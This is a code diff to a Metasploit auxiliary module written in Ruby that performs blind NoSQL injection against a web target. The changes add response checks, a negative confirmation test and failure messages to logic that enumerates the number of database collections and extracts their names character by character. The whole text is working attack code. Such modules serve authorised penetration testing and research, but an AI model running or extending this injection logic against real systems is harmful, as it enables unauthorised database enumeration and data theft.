@@ -47,6 +47,10 @@ class Metasploit4 < Msf::Auxiliary
       'uri' => uri.sub('[NoSQLi]', '')
     })
 
+    if !res
+      fail_with("Server did not respond in an expected way.")
+    end
+
     pay = ""
     fals = res.body
     tru = nil
@@ -57,12 +61,25 @@ class Metasploit4 < Msf::Auxiliary
         'uri' => uri.sub('[NoSQLi]', payload[0])
       })
 
-      if res.body != fals and res.code == 200
+      if res and res.body != fals and res.code == 200
         print_status("Looks like " + payload[0] + " works")
         tru = res.body
+      end
+
+      res = send_request_cgi({
+        'uri' => uri.sub('[NoSQLi]', payload[0].sub('true', 'false').sub('this', '!this'))
+      })
+
+      if res and res.body != tru and res.code == 200
+        vprint_status("I think I confirmed with a negative test.")
+        fals = res.body
         pay = payload[1]
         break
       end
+    end
+
+    if pay == ''
+      fail_with("Couldn't detect a payload, maybe it isn't injectable.")
     end
 
     length = 0
@@ -73,7 +90,7 @@ class Metasploit4 < Msf::Auxiliary
         'uri' => uri.sub('[NoSQLi]', pay.sub('[inject]', str))
       })
 
-      if res.body == tru
+      if res and res.body == tru
         length = len
         print_status("#{len} collections are available")
         break
@@ -92,7 +109,7 @@ class Metasploit4 < Msf::Auxiliary
           'uri' => uri.sub('[NoSQLi]', pay.sub('[inject]', str))
         })
 
-        if res.body == tru
+        if res and res.body == tru
           name_len = k
           print_status("Length of collection #{i}'s name is #{k}")
           break
@@ -109,14 +126,14 @@ class Metasploit4 < Msf::Auxiliary
             'uri' => uri.sub('[NoSQLi]', pay.sub('[inject]', str))
           })
 
-          if res.body == tru
+          if res and res.body == tru
             name << c
             break
           end
         end
       end
 
-      print_status ("Collections #{i}'s name is " + name)
+      print_status("Collections #{i}'s name is " + name)
     end
 
   end
